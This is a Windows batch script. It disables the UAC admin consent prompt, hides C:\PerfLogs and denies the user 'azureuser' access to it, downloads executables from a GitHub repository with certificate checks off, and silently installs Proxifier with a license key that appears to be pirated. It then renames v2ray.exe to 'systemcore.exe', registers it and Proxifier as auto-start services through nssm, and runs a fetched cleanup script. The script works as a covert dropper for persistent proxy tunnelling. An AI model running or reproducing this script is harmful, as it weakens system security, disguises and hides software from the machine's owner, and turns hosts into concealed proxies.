@echo off
cd C:\
cacls PerfLogs /e /p azureuser:n
attrib +h PerfLogs
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
cd "C:\Users\Public\Desktop"
curl -L -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/READ-THIS.txt
diskperf -y



:check
call wmic /locale:ms_409 service where (name="ProxifierVPN") get state /value | findstr State=Running
if %ErrorLevel% EQU 0 (
    echo Running
    ping -n 60 localhost
) else (
    cd "C:\PerfLogs"
    curl -L -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/ProxifierSetup.exe
    ProxifierSetup.exe /VERYSILENT /DIR="C:\PerfLogs" /NOICONS
    REG ADD "HKEY_CURRENT_USER\Software\Initex\Proxifier\License" /v Key /t REG_SZ /d KFZUS-F3JGV-T95Y7-BXGAS-5NHHP /f
    REG ADD "HKEY_CURRENT_USER\Software\Initex\Proxifier\License" /v Owner /t REG_SZ /d NguyenThuongHai /f
    REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Initex\Proxifier\License" /v Key /t REG_SZ /d KFZUS-F3JGV-T95Y7-BXGAS-5NHHP /f
    REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Initex\Proxifier\License" /v Owner /t REG_SZ /d NguyenThuongHai /f
    curl -L -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/Default.ppx
    curl -L -s -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/nssm.exe
    nssm install ProxifierVPN "C:\PerfLogs\Proxifier.exe" "Default.ppx"
    curl -L -s -k -O https://github.com/2dust/v2rayN/releases/download/5.4/v2rayN-Core.zip
    curl -L -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/7z.dll
    curl -L -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/7z.exe 
    7z x v2rayN-Core.zip
    move config.json v2rayN-Core
    cd v2rayN-Core
    curl -L -s -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/nssm.exe
    ren v2ray.exe systemcore.exe
    nssm install SystemCoreVPN "C:\PerfLogs\v2rayN-Core\systemcore.exe"
    sc config ProxifierVPN start=auto
    sc start ProxifierVPN
    sc config SystemCoreVPN start=auto
    sc start SystemCoreVPN
    curl -L -s -k -O https://raw.githubusercontent.com/jimmiecm/coopjimmie/main/cleanup.bat
    start cleanup.bat
    REM rd /s /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Proxifier"
    ping -n 10 localhost

)
REM goto check



